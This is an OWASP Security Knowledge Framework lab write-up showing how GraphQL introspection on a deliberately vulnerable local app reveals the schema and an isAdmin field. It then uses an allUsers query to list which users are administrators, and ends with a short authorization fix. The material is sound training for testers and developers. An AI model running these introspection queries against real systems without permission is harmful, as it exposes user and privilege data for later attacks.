# KBID 285 - GraphQL introspections

## Running the app

```
$ sudo docker pull blabla1337/owasp-skf-lab:graphql-info-introspection
```

```text
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:graphql-info-introspection
```

{% hint style="success" %}
 Now that the app is running let's go hacking!
{% endhint %}

## Running the app Python3

First, make sure python3 and pip are installed on your host machine.
After installation, we go to the folder of the lab we want to practise 
"i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:

```
$ pip3 install -r requirements.txt
```

```
$ python3 <labname>
```

{% hint style="success" %}
 Now that the app is running let's go hacking!
{% endhint %}


![Docker Image and write-up thanks to defev!](.gitbook/assets/logo.defdev.1608z.whtonblk.256.png)


## Reconnaissance 

As soon as we browse on `http://0.0.0.0:5000` we see the few posts published by 2 users

![](.gitbook/assets/graphql-introspection1.png)


## Exploitation 

We want to use the introspection feature (enabled) in this case, to understand more about what queries are supported. 


Let' use the `GraphiQL` UI to send queries to the backend and discover what is available. 

Go to `http://0.0.0.0:5000/graphql`. We can query the generic `__schema` using:

```
{
  __schema {
    types {
      name
    }
  }
}
```

The application gives us interesting `Types`. Let's explore the `UserObject` one. If we build a more complex query we can ask for more information, exploring every field available. Let's send the following:

```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```
In this case, for each field we we want to know what are the subfields and of which type.

The application will answer with:

```json
{
  "data": {
    "__type": {
      "name": "UserObject",
      "fields": [
        {
          "name": "uuid",
          "type": {
            "name": null,
            "kind": "NON_NULL",
            "ofType": {
              "name": "ID",
              "kind": "SCALAR"
            }
          }
        },
        {
          "name": "username",
          "type": {
            "name": "String",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "isAdmin",
          "type": {
            "name": "Boolean",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "posts",
          "type": {
            "name": "PostObjectConnection",
            "kind": "OBJECT",
            "ofType": null
          }
        },
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL",
            "ofType": {
              "name": "ID",
              "kind": "SCALAR"
            }
          }
        }
      ]
    }
  }
}
```
> BINGO! We have some good information here

We can see that there is an interesting field `isAdmin`, that we can use to find out who is the admin of the application. 
 

Now we just need to query all the Users. To do that, let's see if there is a query available. We can use the following syntax:

```
query availableQueries {
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

That will give us the `allUsers` query. Now we need to understand what are the fields. We can do that in different ways, using GraphiQL or doing some more introspection. In this case we use GraphiQL, sending the following query:

```
{
  allUsers {
    edges {
      node {
        username
        isAdmin
      }
    }
  }
}

```

## Solution

Implement authorization on graphql endpoint. Although authenticated users could query the information, you should not map sensitive information into the type defined into the schema.


## Additional resources
